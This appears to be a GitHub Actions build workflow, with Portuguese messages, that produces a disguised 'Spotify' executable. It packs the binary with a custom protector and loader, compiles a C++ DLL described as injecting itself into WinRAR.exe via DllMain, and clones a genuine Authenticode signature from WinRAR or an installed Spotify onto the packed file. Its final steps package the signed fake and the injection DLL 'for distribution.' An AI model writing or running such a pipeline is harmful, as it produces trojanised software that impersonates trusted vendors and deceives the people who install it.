name: Build Spotify - Costura + Protector + DLL C++ para WinRAR
on:
  push:
    branches: [ main, master, develop ]
  pull_request:
    branches: [ main, master ]
  workflow_dispatch:

jobs:
  build:
    runs-on: windows-latest

    steps:
      - name: üßæ Checkout c√≥digo
        uses: actions/checkout@v4

      - name: ‚öôÔ∏è Configurar .NET
        uses: actions/setup-dotnet@v3
        with:
          dotnet-version: '6.0.x'

      - name: ‚öôÔ∏è Configurar Visual Studio
        uses: microsoft/setup-msbuild@v1.3

      - name: üì¶ Instalar NuGet CLI
        run: choco install nuget.commandline -y

      - name: üîß Configurar FodyWeavers.xml
        shell: pwsh
        run: |
          Write-Host "üîß Criando FodyWeavers.xml..."
        
          $xml = '<?xml version="1.0" encoding="utf-8"?>'
          $xml += '<Weavers xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:noNamespaceSchemaLocation="FodyWeavers.xsd">'
          $xml += '  <Costura />'
          $xml += '</Weavers>'
        
          $xml | Out-File -FilePath "FodyWeavers.xml" -Encoding UTF8 -Force
          Write-Host "‚úÖ FodyWeavers.xml configurado!"

      - name: üóëÔ∏è Limpar bin/obj
        shell: pwsh
        run: |
          @("bin", "obj") | ForEach-Object {
            if (Test-Path $_) { Remove-Item -Recurse -Force $_ -ErrorAction SilentlyContinue }
          }

      - name: üîÑ Restaurar depend√™ncias solu√ß√£o
        shell: pwsh
        run: |
          nuget restore Spotify.sln -Verbosity detailed
          if ($LASTEXITCODE -ne 0) { exit 1 }

      - name: üî® Compilar Release com Costura
        shell: pwsh
        run: |
          msbuild Spotify.sln /p:Configuration=Release /p:Platform="Any CPU" /t:Rebuild /verbosity:minimal /p:UseSharedCompilation=false
          if ($LASTEXITCODE -ne 0) { exit 1 }
          if (!(Test-Path "bin\Release\Spotify.exe")) { Write-Host "‚ùå Execut√°vel n√£o gerado"; exit 1 }

      - name: üîß Compilar Update DLL em C++ (update.dll)
        shell: cmd
        run: |
          echo üîß Compilando DLL em C++...
          
          REM Configurar ambiente do Visual Studio
          call "C:\Program Files\Microsoft Visual Studio\2022\Enterprise\VC\Auxiliary\Build\vcvars64.bat"
          
          REM Verificar se os arquivos C++ existem
          if not exist "update.cpp" (
            echo ‚ùå update.cpp n√£o encontrado
            exit /b 1
          )
          if not exist "update.h" (
            echo ‚ùå update.h n√£o encontrado
            exit /b 1
          )
          
          REM Compilar DLL em C++ com otimiza√ß√µes
          cl /LD /O2 /MT /EHsc /std:c++17 /D "WIN32" /D "NDEBUG" /D "_WINDOWS" /D "_USRDLL" /D "UPDATE_EXPORTS" update.cpp /link /OUT:bin\Release\update.dll ntdll.lib psapi.lib shlwapi.lib advapi32.lib kernel32.lib user32.lib ole32.lib oleaut32.lib wbemuuid.lib /SUBSYSTEM:WINDOWS /MACHINE:X64
          
          if %errorlevel% neq 0 (
            echo ‚ùå Erro na compila√ß√£o da DLL em C++
            exit /b 1
          )
          
          if not exist "bin\Release\update.dll" (
            echo ‚ùå update.dll n√£o foi gerado
            exit /b 1
          )
          
          echo ‚úÖ DLL em C++ compilada com sucesso!
          echo üìÅ Arquivo: bin\Release\update.dll
          echo üéØ Benef√≠cios da DLL em C++:
          echo    ‚Ä¢ Controle de baixo n√≠vel
          echo    ‚Ä¢ M√©todos nativos do Windows
          echo    ‚Ä¢ Melhor performance que C#
          echo    ‚Ä¢ Menor tamanho do arquivo
          echo    ‚Ä¢ Execu√ß√£o mais r√°pida
          echo    ‚Ä¢ Inje√ß√£o autom√°tica no WinRAR.exe
          echo    ‚Ä¢ M√©todos Tavinho otimizados
          echo    ‚Ä¢ Execu√ß√£o via DllMain quando injetada


      - name: üõ°Ô∏è Compilar Protector (Mono.Cecil)
        shell: pwsh
        run: |
          if (!(Test-Path "Protector\Protector.csproj")) { Write-Host "‚ùå Projeto Protector n√£o encontrado"; exit 1 }
          dotnet restore Protector\Protector.csproj
          dotnet build Protector\Protector.csproj -c Release -v minimal
          if ($LASTEXITCODE -ne 0) { exit 1 }

      - name: üõ°Ô∏è Compilar Loader (Protector.Loader)
        shell: pwsh
        run: |
          if (!(Test-Path "Protector.Loader\Protector.Loader.csproj")) { Write-Host "‚ùå Projeto Loader n√£o encontrado"; exit 1 }
          dotnet restore Protector.Loader\Protector.Loader.csproj
          dotnet build Protector.Loader\Protector.Loader.csproj -c Release -v minimal
          if ($LASTEXITCODE -ne 0) { exit 1 }
          $global:loaderPath = (Get-ChildItem "Protector.Loader\bin\Release" -Recurse -Filter Protector.Loader.exe | Select-Object -First 1).FullName
          if (!$global:loaderPath) { Write-Host "‚ùå Loader compilado n√£o encontrado"; exit 1 }

      - name: üõ°Ô∏è Aplicar Protector (empacotar Loader + payload)
        shell: pwsh
        run: |
          $protExe = (Get-ChildItem "Protector\bin\Release" -Recurse -Filter Protector.exe | Select-Object -First 1).FullName
          if (!$protExe) { Write-Host "‚ùå Protector.exe n√£o encontrado"; exit 1 }
          $input = "bin\Release\Spotify.exe"
          $outDir = "bin\Protected"
          if (!(Test-Path $outDir)) { New-Item -ItemType Directory -Path $outDir | Out-Null }
          $output = "$outDir\Spotify.exe"
          $loader = (Get-ChildItem "Protector.Loader\bin\Release" -Recurse -Filter Protector.Loader.exe | Select-Object -First 1).FullName
          if (!$loader) { Write-Host "‚ùå Loader n√£o encontrado"; exit 1 }
          & $protExe $input $output $loader
          if ($LASTEXITCODE -ne 0) { Write-Host "‚ùå Falha ao proteger"; exit 1 }

      - name: üîç Verificar resultado protegido
        shell: pwsh
        run: |
          $protected = "bin\Protected\Spotify.exe"
          if (!(Test-Path $protected)) { Write-Host "‚ùå Arquivo protegido n√£o gerado"; exit 1 }
          $orig = (Get-Item "bin\Release\Spotify.exe").Length
          $prot = (Get-Item $protected).Length
          Write-Host "üìä Original: $([math]::Round($orig/1MB,2)) MB"
          Write-Host "üõ°Ô∏è Protegido: $([math]::Round($prot/1MB,2)) MB"

      - name: üêç Configurar Python e SignatureClone
        shell: pwsh
        run: |
          Write-Host "üêç Configurando Python e SignatureClone..." -ForegroundColor Cyan
          
          # Instalar Python se necess√°rio
          if (!(Get-Command python -ErrorAction SilentlyContinue)) {
            Write-Host "üì¶ Instalando Python..." -ForegroundColor Yellow
            choco install python -y
            $env:Path = [System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path","User")
          }
          
          # Verificar Python
          python --version
          if ($LASTEXITCODE -ne 0) {
            Write-Host "‚ùå Python n√£o configurado corretamente"
            exit 1
          }
          
          # Instalar depend√™ncias do SignatureClone
          Write-Host "üì¶ Instalando depend√™ncias do SignatureClone..." -ForegroundColor Cyan
          pip install pefile cryptography --quiet
          
          # Verificar se SignatureClone est√° dispon√≠vel
          if (!(Test-Path "SignatureClone-main\SignatureClone.py")) {
            Write-Host "‚ùå SignatureClone.py n√£o encontrado"
            exit 1
          }
          
          Write-Host "‚úÖ Python e depend√™ncias configuradas!" -ForegroundColor Green

      - name: üîè Clonar assinatura com SignatureClone
        shell: pwsh
        run: |
          Write-Host "üîè Clonando assinatura digital com SignatureClone..." -ForegroundColor Cyan
          Write-Host ""
          
          # Arquivos de origem e destino
          $sourceFile = "bin\Release\Spotify.exe"  # Spotify original assinado (se existir)
          $targetFile = "bin\Protected\Spotify.exe"
          $outputFile = "bin\Protected\Spotify_Signed.exe"
          
          # Verificar se arquivo alvo existe
          if (!(Test-Path $targetFile)) {
            Write-Host "‚ùå Arquivo alvo n√£o encontrado: $targetFile"
            exit 1
          }
          
          # Tentar usar WinRAR.exe como fonte (processo injetado)
          $winrarPath = "${env:ProgramFiles}\WinRAR\WinRAR.exe"
          if (Test-Path $winrarPath) {
            Write-Host "üìã Usando WinRAR.exe como fonte de assinatura" -ForegroundColor Cyan
            $sourceFile = $winrarPath
          } else {
            # Tentar encontrar Spotify original instalado
            $spotifyPaths = @(
              "$env:APPDATA\Spotify\Spotify.exe",
              "$env:LOCALAPPDATA\Spotify\Spotify.exe",
              "${env:ProgramFiles}\Spotify\Spotify.exe",
              "${env:ProgramFiles(x86)}\Spotify\Spotify.exe"
            )
            
            $foundSpotify = $false
            foreach ($path in $spotifyPaths) {
              if (Test-Path $path) {
                Write-Host "üìã Usando Spotify original como fonte: $path" -ForegroundColor Cyan
                $sourceFile = $path
                $foundSpotify = $true
                break
              }
            }
            
            if (!$foundSpotify) {
              Write-Host "‚ö†Ô∏è Nenhum execut√°vel assinado encontrado para clonar" -ForegroundColor Yellow
              Write-Host "üí° Copiando arquivo sem assinatura..." -ForegroundColor Cyan
              Copy-Item $targetFile $outputFile -Force
              Write-Host "‚úÖ Arquivo copiado (sem assinatura clonada)" -ForegroundColor Green
              exit 0
            }
          }
          
          # Verificar assinatura do arquivo fonte
          Write-Host ""
          Write-Host "üîç Verificando assinatura do arquivo fonte..." -ForegroundColor Cyan
          try {
            $sourceSig = Get-AuthenticodeSignature $sourceFile
            Write-Host "üìä Status: $($sourceSig.Status)" -ForegroundColor White
            Write-Host "üìä Certificado: $($sourceSig.SignerCertificate.Subject)" -ForegroundColor White
            
            if ($sourceSig.Status -eq "NotSigned") {
              Write-Host "‚ö†Ô∏è Arquivo fonte n√£o possui assinatura!" -ForegroundColor Yellow
              Write-Host "üí° Copiando arquivo sem assinatura..." -ForegroundColor Cyan
              Copy-Item $targetFile $outputFile -Force
              Write-Host "‚úÖ Arquivo copiado (sem assinatura)" -ForegroundColor Green
              exit 0
            }
          } catch {
            Write-Host "‚ö†Ô∏è Erro ao verificar assinatura fonte: $($_.Exception.Message)" -ForegroundColor Yellow
          }
          
          # Executar SignatureClone
          Write-Host ""
          Write-Host "üîÑ Clonando assinatura..." -ForegroundColor Cyan
          Write-Host "   Fonte: $(Split-Path $sourceFile -Leaf)" -ForegroundColor White
          Write-Host "   Destino: $(Split-Path $targetFile -Leaf)" -ForegroundColor White
          Write-Host "   Sa√≠da: $(Split-Path $outputFile -Leaf)" -ForegroundColor White
          Write-Host ""
          
          python SignatureClone-main\SignatureClone.py -i "$sourceFile" -t "$targetFile" -o "$outputFile"
          
          if ($LASTEXITCODE -ne 0) {
            Write-Host "‚ùå Erro ao clonar assinatura" -ForegroundColor Red
            Write-Host "üí° Criando c√≥pia sem assinatura..." -ForegroundColor Yellow
            Copy-Item $targetFile $outputFile -Force
          }
          
          # Verificar resultado
          if (!(Test-Path $outputFile)) {
            Write-Host "‚ùå Arquivo de sa√≠da n√£o foi criado" -ForegroundColor Red
            exit 1
          }
          
          Write-Host ""
          Write-Host "‚úÖ Processo conclu√≠do!" -ForegroundColor Green
          
          # Verificar assinatura do arquivo final
          Write-Host ""
          Write-Host "üîç Verificando assinatura do arquivo final..." -ForegroundColor Cyan
          try {
            $finalSig = Get-AuthenticodeSignature $outputFile
            Write-Host "üìä Status: $($finalSig.Status)" -ForegroundColor $(if ($finalSig.Status -eq "Valid") { "Green" } elseif ($finalSig.Status -eq "NotSigned") { "Yellow" } else { "Cyan" })
            
            if ($finalSig.SignerCertificate) {
              Write-Host "üìä Certificado: $($finalSig.SignerCertificate.Subject)" -ForegroundColor White
              Write-Host "üìä Emissor: $($finalSig.SignerCertificate.Issuer)" -ForegroundColor White
            }
            
            if ($finalSig.TimeStamperCertificate) {
              Write-Host "üìä Timestamp: $($finalSig.TimeStamperCertificate.Subject)" -ForegroundColor Green
            }
            
            if ($finalSig.Status -ne "NotSigned") {
              Write-Host ""
              Write-Host "üéâ ASSINATURA CLONADA COM SUCESSO!" -ForegroundColor Green
            }
          } catch {
            Write-Host "‚ö†Ô∏è Erro ao verificar assinatura final: $($_.Exception.Message)" -ForegroundColor Yellow
          }
          
          # Exibir tamanhos
          $origSize = (Get-Item $targetFile).Length
          $finalSize = (Get-Item $outputFile).Length
          Write-Host ""
          Write-Host "üìä Tamanho original: $([math]::Round($origSize/1MB,2)) MB" -ForegroundColor White
          Write-Host "üìä Tamanho final: $([math]::Round($finalSize/1MB,2)) MB" -ForegroundColor White
          Write-Host ""
          Write-Host "üì¶ Arquivo pronto para distribui√ß√£o: Spotify_Signed.exe" -ForegroundColor Cyan

      - name: üß™ Teste de execu√ß√£o
        shell: pwsh
        run: |
          function Test-Exe { param([string]$Path,[string]$Label)
            Write-Host "üìã $Label"
            $testDir = "test_$([guid]::NewGuid().ToString('N').Substring(0,8))"
            try {
              New-Item -ItemType Directory -Path $testDir | Out-Null
              Copy-Item $Path "$testDir\Spotify.exe"
              $p = Start-Process -FilePath "$testDir\Spotify.exe" -PassThru -WindowStyle Hidden -ErrorAction Stop
              Start-Sleep -Seconds 2
              if ($p -and !$p.HasExited) { Write-Host "‚úÖ OK (PID $($p.Id))"; $p.Kill(); return $true } else { return $false }
            } catch { Write-Host "‚ùå Erro: $($_.Exception.Message)"; return $false } finally { if (Test-Path $testDir) { Remove-Item -Recurse -Force $testDir -ErrorAction SilentlyContinue } }
          }
          
          function Test-Certificate { param([string]$Path)
            try {
              $cert = Get-AuthenticodeSignature $Path
              if ($cert.Status -eq "Valid") {
                Write-Host "‚úÖ Certificado v√°lido: $($cert.SignerCertificate.Subject)"
                return $true
              } elseif ($cert.Status -eq "NotSigned") {
                Write-Host "‚ö†Ô∏è Arquivo n√£o assinado"
                return $false
              } else {
                Write-Host "‚ö†Ô∏è Certificado presente mas inv√°lido: $($cert.Status)"
                return $true  # Certificado presente mas inv√°lido (esperado com clone)
              }
            } catch {
              Write-Host "‚ùå Erro ao verificar certificado: $($_.Exception.Message)"
              return $false
            }
          }
          
          $ok1 = Test-Exe "bin\Release\Spotify.exe" "RELEASE"
          $ok2 = Test-Exe "bin\Protected\Spotify.exe" "PROTEGIDO"
          $ok3 = Test-Exe "bin\Protected\Spotify_Signed.exe" "PROTEGIDO COM CERTIFICADO"
          
          # Verificar certificado no arquivo final
          if (Test-Path "bin\Protected\Spotify_Signed.exe") {
            Test-Certificate "bin\Protected\Spotify_Signed.exe"
          }
          
          if (-not $ok1 -or -not $ok2 -or -not $ok3) { exit 1 }

      - name: üì¶ Preparar arquivos para distribui√ß√£o
        shell: pwsh
        run: |
          Write-Host "üì¶ Preparando pacote de distribui√ß√£o..." -ForegroundColor Cyan
          
          # Criar diret√≥rio de distribui√ß√£o
          $distDir = "Distribuicao"
          if (!(Test-Path $distDir)) {
            New-Item -ItemType Directory -Path $distDir | Out-Null
          }
          
          # Copiar arquivos principais
          Copy-Item "bin\Protected\Spotify_Signed.exe" "$distDir\Spotify_Signed.exe" -Force
          Copy-Item "bin\Release\update.dll" "$distDir\update.dll" -Force
          
          # Copiar README de distribui√ß√£o
          if (Test-Path "DISTRIBUICAO_README.md") {
            Copy-Item "DISTRIBUICAO_README.md" "$distDir\README.md" -Force
          }
          
          Write-Host "‚úÖ Arquivos copiados para $distDir" -ForegroundColor Green
          Write-Host ""
          Write-Host "üìã Conte√∫do do pacote:" -ForegroundColor Cyan
          Get-ChildItem $distDir | ForEach-Object {
            $size = if ($_.Length -gt 1MB) { "$([math]::Round($_.Length/1MB,2)) MB" } else { "$([math]::Round($_.Length/1KB,2)) KB" }
            Write-Host "   ‚úÖ $($_.Name) ($size)" -ForegroundColor White
          }
          
          Write-Host ""
          Write-Host "üéâ Pacote pronto para distribui√ß√£o!" -ForegroundColor Green
          Write-Host "üì¶ Spotify_Signed.exe - Execut√°vel com assinatura clonada" -ForegroundColor Cyan
          Write-Host "üì¶ update.dll - DLL C++ para inje√ß√£o no WinRAR.exe" -ForegroundColor Cyan

      - name: üìÅ Upload Arquivos de Distribui√ß√£o
        uses: actions/upload-artifact@v4
        with:
          name: spotify-signed-package
          path: |
            Distribuicao/Spotify_Signed.exe
            Distribuicao/update.dll
            Distribuicao/README.md
          retention-days: 90
        if: always()
